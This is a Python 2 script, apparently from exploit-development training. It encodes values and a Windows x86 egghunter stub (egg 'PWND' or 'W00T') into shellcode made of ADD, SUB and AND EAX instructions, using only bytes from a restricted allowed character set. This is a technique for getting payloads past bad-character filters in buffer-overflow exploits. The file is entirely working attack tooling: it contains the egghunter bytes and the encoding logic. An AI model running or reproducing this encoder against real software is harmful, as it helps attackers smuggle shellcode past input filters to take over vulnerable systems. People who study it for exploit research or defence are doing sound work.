import itertools
from random import randint
import sys

allowed = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3b\x3c\x3d\x3e\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"

ADD_EAX = '05'
SUB_EAX = '2D'
AND_EAX = '25'
bl = "\\x"

#egg is PWND
egg1 = "\x66\x81\xca\xff"
egg2 = "\x0f\x42\x52\x6a"
egg3 = "\x02\x58\xcd\x2e"
egg4 = "\x3c\x05\x5a\x74"
egg5 = "\xef\xb8\x50\x57"
egg6 = "\x4e\x44\x89\xd7"
egg7 = "\xaf\x75\xea\xaf"
egg8 = "\x75\xe7\xff\xe7"


#egg is W00T
egg1 = "\x66\x81\xca\xff"
egg2 = "\x0f\x42\x52\x6a"
egg3 = "\x02\x58\xcd\x2e"
egg4 = "\x3c\x05\x5a\x74"
egg5 = "\xef\xb8\x54\x30"
egg6 = "\x30\x57\x8b\xfa"
egg7 = "\xaf\x75\xea\xaf"
egg8 = "\x75\xe7\xff\xe7"



allowed_nr = [ord(x) for x in allowed]

if len(sys.argv) != 3:
    print "Usage : " + sys.argv[0] + " <HEX_VALUE> [a/s]"
    print "\tHEX_VALUE: 8 character value to be added to ESP"
    sys.exit(1)



def compute(a, op):
    print("Value: " + a)
    a1 = int(a[:2],16)
    a2 = int(a[2:4],16)
    a3 = int(a[4:6],16)
    a4 = int(a[6:8],16)

    if a1 < 51: #== 0:
        a1 = 256 + a1
    if a4 < 51:
        a4 = 256 + a4
        if a3 == 0:
            a3 = 255
            if a2 == 0:
                a2 = 255
                a1 = a1 - 1
            else:
                a2 = a2 - 1
        else:
            a3 = a3 - 1
    if a3 < 51:
        a3 = 256 + a3
        if a2 == 0:
            a2 = 255
            a1 = a1 - 1
        else:
            a2 = a2 - 1
    if a2 < 51:
        a2 = 256 + a2
        a1 = a1 - 1
    if a1 < 0:
        a1 = 256 - a1 + 1

    s = [[], [], [], []]

    trees = itertools.combinations_with_replacement(allowed_nr,3)
    tlist = list(trees)
    for tp in tlist:
        if tp[0] + tp[1] + tp[2] == a1:
            s[0].append(tp)
        if tp[0] + tp[1] + tp[2] == a2:
            s[1].append(tp)
        if tp[0] + tp[1] + tp[2] == a3:
            s[2].append(tp)
        if tp[0] + tp[1] + tp[2] == a4:
            s[3].append(tp)

    c1 = randint(0, len(s[0]) - 1)
    tr11 = format(s[0][c1][0], '02x')
    tr12 = format(s[0][c1][1], '02x')
    tr13 = format(s[0][c1][2], '02x')
    print(format(a1, '02x') + " = " + tr11 + " + " + tr12 + " + " + tr13)
    c2 = randint(0, len(s[1]) - 1)
    tr21 = format(s[1][c2][0], '02x')
    tr22 = format(s[1][c2][1], '02x')
    tr23 = format(s[1][c2][2], '02x')
    print(format(a2, '02x') + " = " + format(s[1][c2][0], '02x') + " + " + format(s[1][c2][1], '02x') + " + " + format(s[1][c2][2], '02x'))
    c3 = randint(0, len(s[2]) - 1)
    tr31 = format(s[2][c3][0], '02x')
    tr32 = format(s[2][c3][1], '02x')
    tr33 = format(s[2][c3][2], '02x')
    print(format(a3, '02x') + " = " + format(s[2][c3][0], '02x') + " + " + format(s[2][c3][1], '02x') + " + " + format(s[2][c3][2], '02x'))
    c4 = randint(0, len(s[3]) - 1)
    tr41 = format(s[3][c4][0], '02x')
    tr42 = format(s[3][c4][1], '02x')
    tr43 = format(s[3][c4][2], '02x')
    print(format(a4, '02x') + " = " + format(s[3][c4][0], '02x') + " + " + format(s[3][c4][1], '02x') + " + " + format(s[3][c4][2], '02x'))
    print("Value: " + a + " = " + tr11 + tr21 + tr31 + tr41 + " + " + tr12 + tr22 + tr32 + tr42 + " + " + tr13 + tr23 + tr33 + tr43 + " = " + format((int(tr11+tr21+tr31+tr41,16) + int(tr12+tr22+tr32+tr42,16) + int(tr13+tr23+tr33+tr43,16)), 'x'))
    print("Shellcode: ")
    print(bl + op + bl + tr41 + bl + tr31 + bl + tr21 + bl + tr11 + bl + op + bl + tr42 + bl + tr32 + bl + tr22 + bl + tr12 + bl + op + bl + tr43 + bl + tr33 + bl + tr23 + bl + tr13)



value = sys.argv[1]
if len(value) != 8:
    print "Not a correct value, should be a DWORD"
    sys.exit(1)

operation = sys.argv[2]
if operation != 'a' and operation != 's':
    print "Operation can only be a(addition) or s(substraction)"
    sys.exit(1)


op = ADD_EAX if operation == 'a' else SUB_EAX
if op == SUB_EAX:
    value = format(((int(value, 16) ^ 0xFFFFFFFF) + 1), 'x')
compute(value, op)


print "\nFor zeroing out: "
zeros = []
twos = itertools.combinations_with_replacement(allowed_nr, 2)
tlist = list(twos)
for tp in tlist:
    if tp[0] & tp[1] == 0:
        zeros.append(tp)

c = randint(0, len(zeros) - 1)
z1 = format(zeros[c][0], '02x')
z2 = format(zeros[c][1], '02x')
print("AND " + z1 + ", " + z2)
print("Shellcode: ")
zero_sh = bl + "25" + (bl + z1) * 4 + bl + "25" + (bl + z2) * 4
print(zero_sh)

#sys.exit(0)
print("\nEggHunter:")
egg_part = ''.join([format(ord(x), '02x') for x in egg8[::-1]])
print egg_part
value = egg_part if op == ADD_EAX else format(((int(egg_part, 16) ^ 0xFFFFFFFF) + 1), 'x')
compute(value, op)
print

egg_part = ''.join([format(ord(x), '02x') for x in egg7[::-1]])
print egg_part
value = egg_part if op == ADD_EAX else format(((int(egg_part, 16) ^ 0xFFFFFFFF) + 1), 'x')
compute(value, op)
print

egg_part = ''.join([format(ord(x), '02x') for x in egg6[::-1]])
print egg_part
value = egg_part if op == ADD_EAX else format(((int(egg_part, 16) ^ 0xFFFFFFFF) + 1), 'x')
compute(value, op)
print

egg_part = ''.join([format(ord(x), '02x') for x in egg5[::-1]])
print egg_part
value = egg_part if op == ADD_EAX else format(((int(egg_part, 16) ^ 0xFFFFFFFF) + 1), 'x')
compute(value, op)
print

egg_part = ''.join([format(ord(x), '02x') for x in egg4[::-1]])
print egg_part
value = egg_part if op == ADD_EAX else format(((int(egg_part, 16) ^ 0xFFFFFFFF) + 1), 'x')
compute(value, op)
print

egg_part = ''.join([format(ord(x), '02x') for x in egg3[::-1]])
print egg_part
value = egg_part if op == ADD_EAX else format(((int(egg_part, 16) ^ 0xFFFFFFFF) + 1), 'x')
compute(value, op)
print

egg_part = ''.join([format(ord(x), '02x') for x in egg2[::-1]])
print egg_part
value = egg_part if op == ADD_EAX else format(((int(egg_part, 16) ^ 0xFFFFFFFF) + 1), 'x')
compute(value, op)
print

egg_part = ''.join([format(ord(x), '02x') for x in egg1[::-1]])
print egg_part
value = egg_part if op == ADD_EAX else format(((int(egg_part, 16) ^ 0xFFFFFFFF) + 1), 'x')
compute(value, op)
print
